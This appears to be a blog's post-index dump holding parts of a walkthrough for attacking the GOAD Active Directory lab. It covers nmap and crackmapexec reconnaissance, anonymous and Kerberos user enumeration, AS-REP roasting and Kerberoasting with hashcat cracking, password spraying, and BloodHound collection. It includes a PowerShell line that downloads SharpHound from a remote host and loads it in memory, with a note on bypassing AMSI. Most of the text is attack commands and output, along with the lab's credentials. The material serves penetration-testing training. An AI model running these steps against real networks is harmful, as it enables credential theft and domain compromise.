23:21:58.774078 jon.snow 2022-06-29 07:48:32.373101 2022-07-03 17:36:26.798060 samwell.tarly 2022-06-29 07:48:35.107476 2022-07-01 16:35:17.043960 jeor.mormont 2022-06-29 07:48:37.841846 &amp;lt;never&amp;gt; sql_svc 2022-06-29 07:48:40.248028 2022-07-03 15:56:57.924607 With ldap query, i recommend this article with all the useful ldap query for active directory : https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/ With ldap on north.sevenkingdoms.local ldapsearch -H ldap://192.168.56.11 -D &quot;brandon.stark@north.sevenkingdoms.local&quot; -w iseedeadpeople -b &#39;DC=north,DC=sevenkingdoms,DC=local&#39; &quot;(&amp;amp;(objectCategory=person)(objectClass=user))&quot; |grep &#39;distinguishedName:&#39; With ldap query we can request users of the others domain because a trust is present. On essos.local ldapsearch -H ldap://192.168.56.12 -D &quot;brandon.stark@north.sevenkingdoms.local&quot; -w iseedeadpeople -b &#39;,DC=essos,DC=local&#39; &quot;(&amp;amp;(objectCategory=person)(objectClass=user))&quot; On sevenkingdoms.localldapsearch -H ldap://192.168.56.10 -D &quot;brandon.stark@north.sevenkingdoms.local&quot; -w iseedeadpeople -b &#39;DC=sevenkingdoms,DC=local&#39; &quot;(&amp;amp;(objectCategory=person)(objectClass=user))&quot;Kerberoasting On an active directory, we will see very often users with an SPN set. let’s find them with impacket GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashesImpacket v0.9.24 - Copyright 2021 SecureAuth CorporationServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation --------------------------------------------------- -------- ---------------------------------------------------------- -------------------------- -------------------------- -----------CIFS/winterfell.north.sevenkingdoms.local jon.snow CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local 2022-06-29 07:48:32.373101 2022-06-29 10:34:54.308171 constrained HTTP/thewall.north.sevenkingdoms.local jon.snow CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local 2022-06-29 07:48:32.373101 2022-06-29 10:34:54.308171 constrained MSSQLSvc/castelblack.north.sevenkingdoms.local sql_svc 2022-06-29 07:48:40.248028 2022-06-29 22:54:57.422114 MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 sql_svc 2022-06-29 07:48:40.248028 2022-06-29 22:54:57.422114All the hashes will be stored in the file named kerberoasting.hashes we could also do that with cme with the following command :cme ldap 192.168.56.11 -u brandon.stark -p &#39;iseedeadpeople&#39; -d north.sevenkingdoms.local --kerberoasting KERBEROASTING Now let’s try to crack the hashes :hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force we quickly get a result with rockyou : And we found another user : north/jon.snow:iknownothingshare enum we got a domain user so we could enumerate the share another time but with a user accountcme smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares Now a new share folder is readable (nothing in it on the lab, but on a real assignment you will get very often juicy informations)DNS dump Another cool thing to do when we got a user is enumerate dns. For this we can use dirkjanm’s tool adidnsdump.adidnsdump -u &#39;north.sevenkingdoms.local\\jon.snow&#39; -p &#39;iknownothing&#39; winterfell.north.sevenkingdoms.local Results are stored in a records.csv filecat records.csv type,name,valueA,winterfell,192.168.56.11A,winterfell,10.0.2.15?,DomainDnsZones,??,castelblack,?NS,@,winterfell.north.sevenkingdoms.local.A,@,192.168.56.11A,@,10.0.2.15Bloodhound Boodhound is one of the best tool for an active directory pentest. This tool will help you to find all the path to pwn the AD and is a must have in your arsenal ! To launch bloodhound you first need to retreive all the datas from the differents domains. Python ingestor - from linux First we will get the datas with the python ingestor : https://github.com/fox-it/BloodHound.py Let’s run the script on north.sevenkingdoms.local : bloodhound.py --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.localOk now, we have all information from the domain north.sevenkingdoms.local. Now try to get information from other domains :bloodhound.py --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.localbloodhound.py --zip -c All -d essos.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc meereen.essos.local We now got the 3 domains informations :) but the python ingestor is not as complete as the .net ingestor as we can see on the github project : “Supports most, but not all BloodHound (SharpHound) features (see below for supported collection methods, mainly GPO based methods are missing)” So let’s do that again from Windows this time. .net ingestor - from Windows The official bloudhound ingestor is sharphound : https://github.com/BloodHoundAD/SharpHound Let’s start an RDP connection xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore The C:\\vagrant folder is automatically mounted on the vm it will simplify file transfert we will launch sharphound to retreive domains informations.\\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip.\\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip.\\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip Or we could also do it in reflection with powershell if you want to play it full in memory (if you do this with defender enabled you will first have to bypass amsi)$data = (New-Object System.Net.WebClient).DownloadData(&#39;http://192.168.56.1/SharpHound.exe&#39;)$assem = [System.Reflection.Assembly]::Load($data)[Sharphound.Program]::Main(&quot;-d north.sevenkingdoms.local -c all&quot;.Split())Hunting with bloodhound Now start neo4j and bloodhound (at the time of writing the python ingestor match bloodhound 4.1 be sure to get the right version) Upload the zips into bloodhound And now show all domains and computerMATCH p = (d:Domain)-[r:Contains*1..]-&amp;gt;(n:Computer) RETURN p And show all the usersMATCH p = (d:Domain)-[r:Contains*1..]-&amp;gt;(n:User) RETURN p let see the overall map of domains/groups/usersMATCH q=(d:Domain)-[r:Contains*1..]-&amp;gt;(n:Group)&amp;lt;-[s:MemberOf]-(u:User) RETURN q Let see the users ACLMATCH p=(u:User)-[r1]-&amp;gt;(n) WHERE r1.isacl=true and not tolower(u.name) contains &#39;vagrant&#39; RETURN p If you want to dig more I recommend the following articles with a lot of useful informations and queries : https://en.hackndo.com/bloodhound/ https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/ In the next article we will start to play with poisoning and ntlm relay : Goad pwning part4" }, { "title": "GOAD - part 2 - find users", "url": "/posts/GOADv2-pwning-part2/", "categories": "AD", "tags": "AD,, Lab,, cme,, enum4linux", "date": "2022-07-04 00:00:00 +0200", "snippet": "We have done some basic reconnaissance on Goad pwning part1, now we will try to enumerate users and start to hunt credentials.Enumerate DC’s anonymouslyWith CMEcme smb 192.168.56.11 --users We get some users with the description and get a first password as samwell.tarly got his password set up in description.we could also retrieve the password policy before trying bruteforce The password policy show us that if we fail 5 times in 5 minutes we lock the accounts for 5minutes.With enum4linux We can confirm the anonymous listing on the NORTH DC also with Enum4linux :enum4linux 192.168.56.11 We get the user list like cme We also get the password policy like cme enum4linux also get the full domain user list by enumerating members of domain groupWith rpc call The anonymous listing is done with Remote Procedure Call on winterfell (192.168.56.11), so we could also do this with rpcclient directly.rpcclient -U &quot;NORTH\\\\&quot; 192.168.56.11 -Nrpcclient $&amp;gt; enumdomusersuser:[Guest] rid:[0x1f5]user:[arya.stark] rid:[0x456]user:[sansa.stark] rid:[0x45a]user:[brandon.stark] rid:[0x45b]user:[rickon.stark] rid:[0x45c]user:[hodor] rid:[0x45d]user:[jon.snow] rid:[0x45e]user:[samwell.tarly] rid:[0x45f]user:[jeor.mormont] rid:[0x460]user:[sql_svc] rid:[0x461]rpcclient $&amp;gt; enumdomgroupsgroup:[Domain Users] rid:[0x201]group:[Domain Guests] rid:[0x202]group:[Domain Computers] rid:[0x203]group:[Group Policy Creator Owners] rid:[0x208]group:[Cloneable Domain Controllers] rid:[0x20a]group:[Protected Users] rid:[0x20d]group:[Key Admins] rid:[0x20e]group:[DnsUpdateProxy] rid:[0x44f]group:[Stark] rid:[0x452]group:[Night Watch] rid:[0x453]group:[Mormont] rid:[0x454] Get all domain users:net rpc group members &#39;Domain Users&#39; -W &#39;NORTH&#39; -I &#39;192.168.56.11&#39; -U &#39;%&#39;NORTH\\AdministratorNORTH\\vagrantNORTH\\krbtgtNORTH\\SEVENKINGDOMS$NORTH\\arya.starkNORTH\\eddard.starkNORTH\\catelyn.starkNORTH\\robb.starkNORTH\\sansa.starkNORTH\\brandon.starkNORTH\\rickon.starkNORTH\\hodorNORTH\\jon.snowNORTH\\samwell.tarlyNORTH\\jeor.mormontNORTH\\sql_svcEnumerate DC’s anonymously - when anonymous sessions are not allowedThe Winterfell domain controler allow anonymous connection, this is the reason why we can list the domain users and groups.But nowadays that kind of configuration almost never happens. (On the opposite password in users description happens quite often x) ).We can still enumerate valid users by bruteforcing them. First let’s create a user list: curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep &#39;href=&quot;/game-of-thrones/cast-and-crew/&#39;| grep -o &#39;aria-label=&quot;[^&quot;]*&quot;&#39; | cut -d &#39;&quot;&#39; -f 2 | awk &#39;{if($2 == &quot;&quot;) {print tolower($1)} else {print tolower($1) &quot;.&quot; tolower($2);} }&#39; &amp;gt; got_users.txt We get the following list: robert.baratheontyrion.lannistercersei.lannistercatelyn.starkjaime.lannisterdaenerys.targaryenviserys.targaryenjon.snowrobb.starksansa.starkarya.starkbran.starkrickon.starkjoffrey.baratheonjorah.mormonttheon.greyjoysamwell.tarlyrenly.baratheonrosjeor.mormontgendrylysa.arrynrobin.arrynbronngrand.maestervarysloras.tyrellshaebenjen.starkbarristan.selmykhal.drogohodorlancel.lannistermaester.luwinalliser.thorneoshamaester.aemontalisa.starkbrienne.ofdavos.seaworthtywin.lannisterstannis.baratheonmargaery.tyrellygrittebalon.greyjoyroose.boltongillypodrick.paynemelisandreyara.greyjoyjaqen.h’ghargrey.wormberic.dondarrionmissandeimance.raydertormundramsay.snowolenna.tyrellthoros.oforellqyburnbrynden.tullytommen.baratheondaario.naharisoberyn.martellmyrcella.baratheonobara.sandnym.sandtyene.sandhigh.sparrowtrystane.martelldoran.martelleuron.greyjoylady.cranehigh.priestessrandyll.tarlyizembarobrother.rayarchmaester.ebrose Let’s try this list on meereen.essos.local domain controler and kingslanding.sevenkingdoms.localnmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#39;sevenkingdoms.local&#39;,userdb=got_users.txt&quot; 192.168.56.10Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 22:13 CESTNmap scan report for sevenkingdoms.local (192.168.56.10)Host is up (0.00028s latency).PORT STATE SERVICE88/tcp open kerberos-sec| krb5-enum-users: | Discovered Kerberos principals| robert.baratheon@sevenkingdoms.local| joffrey.baratheon@sevenkingdoms.local| renly.baratheon@sevenkingdoms.local| jaime.lannister@sevenkingdoms.local| tywin.lannister@sevenkingdoms.local| cersei.lannister@sevenkingdoms.local|_ stannis.baratheon@sevenkingdoms.localMAC Address: 08:00:27:57:A4:F2 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds Great we found 7 valid users on sevenkingdoms.local!nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#39;essos.local&#39;,userdb=got_users.txt&quot; 192.168.56.12Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 22:14 CESTNmap scan report for essos.local (192.168.56.12)Host is up (0.00036s latency).PORT STATE SERVICE88/tcp open kerberos-sec| krb5-enum-users: | Discovered Kerberos principals| viserys.targaryen@essos.local| daenerys.targaryen@essos.local| khal.drogo@essos.local|_ jorah.mormont@essos.localMAC Address: 08:00:27:33:DF:2F (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds And we found 4 valid users on sevenkingdoms.local As we can see on the nmap page : Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication. In summary, the badpwdcount will not be increased when you bruteforce users. Let’s verify it :List guest access on shares Let’s take a look on guest access to the smb shares: We launch the following command with CME : cme smb 192.168.56.10-23 -u &#39;a&#39; -p &#39;&#39; --shares And we found some anonymous shares with READ/WRITE permissionsUser but no credentialsWe got users now try to get password for them.ASREP - roasting We create a users.txt file with all the user name previously found on north.sevenkingdoms.local:sql_svcjeor.mormontsamwell.tarlyjon.snowhodorrickon.starkbrandon.starksansa.starkrobb.starkcatelyn.starkeddard.starkarya.starkkrbtgtvagrantGuestAdministrator We now could try asreproasting on all the users with impacket:GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txtImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation[-] User sql_svc doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User jeor.mormont doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User samwell.tarly doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User jon.snow doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User hodor doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User rickon.stark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:5b71bebe8d2955599a76ccf4a4fec284$c4c31f24c834e7d292283d30a8fe53bc7535cbd09ce607a9c6e83f8a581aab2c55a78c49b4187fb729e47e041e90bc97a893b4cc175114471a3d0463b2f47ac07ca2968a6ebf9b12d84e008fe8a9abe7eb2be9ae16c6096740df6467d856ab7f47a56eea06d6fcf68593b0158dfa670e429aebe291492432f9b66198e880fd77cf70bf23c408b055bccc7660a972bdb959115a9550942bbc9debcd847ff88cffecf70cfa0fd8cb5e9935b0933d59eebd0b53d9ccfafd45a8bfc93709c4c61e73ce526fb1e95199b74649929e0e518436b2eee3ac940cace92183774c72dcc9216cec86c374a4b11deade517e04c5b4e34459c43b80d955f5040c256dd53dd69f5f5373fbbf6c[-] User sansa.stark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User robb.stark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User catelyn.stark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User eddard.stark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] User arya.stark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User vagrant doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User Administrator doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set We get a ticket for brandon.stark and we will try to break it as the user don’t require kerberos pre-authenticationhashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt...Dictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 2 secs$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:5b71bebe8d2955599a76ccf4a4fec284$c4c31f24c834e7d292283d30a8fe53bc7535cbd09ce607a9c6e83f8a581aab2c55a78c49b4187fb729e47e041e90bc97a893b4cc175114471a3d0463b2f47ac07ca2968a6ebf9b12d84e008fe8a9abe7eb2be9ae16c6096740df6467d856ab7f47a56eea06d6fcf68593b0158dfa670e429aebe291492432f9b66198e880fd77cf70bf23c408b055bccc7660a972bdb959115a9550942bbc9debcd847ff88cffecf70cfa0fd8cb5e9935b0933d59eebd0b53d9ccfafd45a8bfc93709c4c61e73ce526fb1e95199b74649929e0e518436b2eee3ac940cace92183774c72dcc9216cec86c374a4b11deade517e04c5b4e34459c43b80d955f5040c256dd53dd69f5f5373fbbf6c:iseedeadpeopleSession..........: hashcatStatus...........: CrackedHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)Hash.Target......: $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOC...fbbf6cTime.Started.....: Mon Jul 4 09:56:16 2022, (0 secs)Time.Estimated...: Mon Jul 4 09:56:16 2022, (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 393.2 kH/s (5.44ms) @ Accel:1024 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) DigestsProgress.........: 57344/14344385 (0.40%)Rejected.........: 0/57344 (0.00%)Restore.Point....: 49152/14344385 (0.34%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: truckin -&amp;gt; YELLOW1Hardware.Mon.#1..: Temp: 78c Util: 80% We found the user password “iseedeadpeople” We now have two couple of credentials : samwell.tarly:Heartsbane brandon.stark:iseedeadpeople Password Spray We could try the classic user=password testcme smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce We also could use sprayhound (https://github.com/Hackndo/sprayhound)sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower We could try sprayhound with a valid user to avoid locking account (option -t to set the number of try left)sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2 See the status of bruteforcecme smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users We now got three couple of credentials : samwell.tarly:Heartsbane (user description) brandon.stark:iseedeadpeople (asreproasting) hodor:hodor (password spray) Great, in the next part we will start to dig what to do with a valid user : Goad pwning part3" }, { "title": "GOAD - part 1 - reconnaissance and scan", "url": "/posts/GOADv2-pwning_part1/", "categories": "AD", "tags": "AD,, Lab,, kerberos,, nmap", "date": "2022-07-03 00:00:00 +0200", "snippet": "The lab is now up and running Goad introduction, let’s do some recon on it.Enumerate NetworkWe will starting the reconnaissance of the Game Of Active Directory environment by searching all the availables IPs.First recon with cmeThe first thing i personally do before launching an nmap is to scan for netbios results.For this i launch crackmapexec (cme) on the IP range to quickly get netbios answers by windows computers.This is a very kick way to get all the windows machine IP, names and domains.cme smb 192.168.56.1/24This command answer relatively quickly and send back a lot of useful informations!We now know there is 3 domains: north.sevenkingdoms.local (2 ip) CASTELBLACK (windows server 2019) (signing false) WINTERFELL (windows server 2019) sevenkingdoms.local (1 ip) KINGSLANDING (windows server 2019) essos.local (2 ip) BRAAVOS (windows server 2016) (signing false) MEEREEN (windows server 2019) Here as we have 3 domains we know that three DCs must be setup.We also know that microsoft setup DC smb signing as true by default. So all the dc are the one with signing at true. (In a secure environment signing must true everywhere to avoid ntlm relay).Find DC ip Let’s enumerate the DCs by quering the dns with nslookupnslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10setup /etc/hosts and kerberos To use kerberos in our Linux environment we will do some configurations. First we must set the DNS by configuring the /etc/hosts file# /etc/hosts# GOAD192.168.56.10 sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding192.168.56.11 winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell192.168.56.12 essos.local meereen.essos.local meereen192.168.56.22 castelblack.north.sevenkingdoms.local castelblack192.168.56.23 braavos.essos.local braavos We must install the Linux kerberos clientsudo apt install krb5-user We answer the questions with : realm : essos.local servers : meereen.essos.local We will setup the /etc/krb5.conf file like this : [libdefaults] default_realm = essos.local kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true fcc-mit-ticketflags = true[realms] north.sevenkingdoms.local = { kdc = winterfell.north.sevenkingdoms.local admin_server = winterfell.north.sevenkingdoms.local } sevenkingdoms.local = { kdc = kingslanding.sevenkingdoms.local admin_server = kingslanding.sevenkingdoms.local } essos.local = { kdc = meereen.essos.local admin_server = meereen.essos.local }... If krb5-user is already installed we can reconfigure it with (dpkg-reconfigure or by modifying /etc/krb5.conf)dpkg-reconfigure krb5-config Now kerberos is set up on our environment we will try if we can get a TGT for a user.getTGT.py essos.local/khal.drogo:horseImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Saving ticket in khal.drogo.ccacheexport KRB5CCNAME=/workspace/khal.drogo.ccache smbclient.py -k @braavos.essos.localImpacket v0.9.24 - Copyright 2021 SecureAuth CorporationType help for list of commands# sharesADMIN$allC$CertEnrollIPC$public# use C$# lsdrw-rw-rw- 0 Wed Jun 29 10:41:11 2022 $Recycle.Bin-rw-rw-rw- 384322 Thu Feb 14 20:38:48 2019 bootmgr-rw-rw-rw- 1 Thu Feb 14 20:38:48 2019 BOOTNXTdrw-rw-rw- 0 Wed Jun 29 01:20:28 2022 Config.Msi-rw-rw-rw- 1914 Wed Jun 29 07:46:13 2022 dns_log.txtdrw-rw-rw- 0 Wed Jun 29 08:29:08 2022 Documents and Settingsdrw-rw-rw- 0 Wed Jun 29 01:26:54 2022 inetpub-rw-rw-rw- 1342177280 Sun Jul 3 22:57:35 2022 pagefile.sysdrw-rw-rw- 0 Thu Feb 14 13:19:12 2019 PerfLogsdrw-rw-rw- 0 Wed Jun 29 01:19:59 2022 Program Filesdrw-rw-rw- 0 Wed Jun 29 01:29:07 2022 Program Files (x86)drw-rw-rw- 0 Wed Jun 29 10:46:28 2022 ProgramDatadrw-rw-rw- 0 Wed Jun 29 00:29:20 2022 Recoverydrw-rw-rw- 0 Wed Jun 29 01:07:10 2022 setupdrw-rw-rw- 0 Wed Jun 29 01:31:47 2022 sharesdrw-rw-rw- 0 Thu Feb 14 20:40:57 2019 System Volume Informationdrw-rw-rw- 0 Wed Jun 29 01:01:06 2022 tmpdrw-rw-rw- 0 Wed Jun 29 10:40:42 2022 Usersdrw-rw-rw- 0 Sun Jul 3 15:58:04 2022 vagrantdrw-rw-rw- 0 Thu Jun 30 17:33:12 2022 Windows Ok the kerberos setup is good :) We could now unset the ticket:unset KRB5CCNAME Trouble on winterfell During the kerberos tests we saw we get trouble on winterfell:getTGT.py north.sevenkingdoms.local/arya.stark:NeedleImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Saving ticket in arya.stark.ccacheexport KRB5CCNAME=/workspace/arya.stark.ccachesmbclient.py -k -no-pass @winterfell.north.sevenkingdoms.localImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.) Actually i don’t know why kerberos doesn’t work on winterfell with the full FQDN, but it’s ok by just setting winterfell instead of winterfell.north.sevenkingdoms.localsmbclient.py -k -no-pass @winterfellImpacket v0.10.0 - Copyright 2022 SecureAuth CorporationType help for list of commands# sharesADMIN$C$IPC$NETLOGONSYSVOL# use SYSVOL# lsdrw-rw-rw- 0 Wed Jun 29 00:48:39 2022 .drw-rw-rw- 0 Wed Jun 29 00:48:39 2022 ..drw-rw-rw- 0 Wed Jun 29 00:48:39 2022 north.sevenkingdoms.localNmapOne thing to know is that nmap will do a ping before scanning the target. If the target doesn’t answer to ping it will be ignore.The way to be sure we doesn’t miss anything on TCP, could be to scan with the following options:nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23Let’s analyze this command : -Pn don’t do ping scan and scan all ip -p- scan the 65535 ports instead of the default nmap 1000 top ports by default -sC play the default script for reconnaissance -sV enumerate the version -oA write results in the 3 available format (nmap classic, grep format, xml format) The full scan result is:Nmap scan report for sevenkingdoms.local (192.168.56.10)Host is up (0.00066s latency).Not shown: 65511 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: IIS Windows Server88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-03 15:14:43Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:kingslanding.sevenkingdoms.local| Not valid before: 2022-06-30T06:55:19|_Not valid after: 2023-06-30T06:55:19445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:kingslanding.sevenkingdoms.local| Not valid before: 2022-06-30T06:55:19|_Not valid after: 2023-06-30T06:55:19|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:kingslanding.sevenkingdoms.local| Not valid before: 2022-06-30T06:55:19|_Not valid after: 2023-06-30T06:55:193269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:kingslanding.sevenkingdoms.local| Not valid before: 2022-06-30T06:55:19|_Not valid after: 2023-06-30T06:55:19|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.3389/tcp open ms-wbt-server Microsoft Terminal Services|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local| Not valid before: 2022-06-27T22:40:05|_Not valid after: 2022-12-27T22:40:05| rdp-ntlm-info: | Target_Name: SEVENKINGDOMS| NetBIOS_Domain_Name: SEVENKINGDOMS| NetBIOS_Computer_Name: KINGSLANDING| DNS_Domain_Name: sevenkingdoms.local| DNS_Computer_Name: kingslanding.sevenkingdoms.local| DNS_Tree_Name: sevenkingdoms.local| Product_Version: 10.0.17763|_ System_Time: 2022-07-03T15:16:37+00:005985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| tls-alpn: |_ http/1.1| ssl-cert: Subject: commonName=VAGRANT| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant| Not valid before: 2022-06-27T15:18:01|_Not valid after: 2025-06-26T15:18:01|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049678/tcp open msrpc Microsoft Windows RPC49680/tcp open msrpc Microsoft Windows RPC49693/tcp open msrpc Microsoft Windows RPC49708/tcp open msrpc Microsoft Windows RPC59098/tcp open msrpc Microsoft Windows RPCMAC Address: 08:00:27:57:A4:F2 (Oracle VirtualBox virtual NIC)Service Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: KINGSLANDING, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 08:00:27:57:a4:f2 (Oracle VirtualBox virtual NIC)| smb2-time: | date: 2022-07-03T15:16:34|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled and requiredNmap scan report for winterfell.north.sevenkingdoms.local (192.168.56.11)Host is up (0.00068s latency).Not shown: 65513 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-03 15:14:49Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:winterfell.north.sevenkingdoms.local| Not valid before: 2022-06-30T13:20:52|_Not valid after: 2023-06-30T13:20:52|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:winterfell.north.sevenkingdoms.local| Not valid before: 2022-06-30T13:20:52|_Not valid after: 2023-06-30T13:20:52|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-07-03T15:17:20+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:winterfell.north.sevenkingdoms.local| Not valid before: 2022-06-30T13:20:52|_Not valid after: 2023-06-30T13:20:523269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP 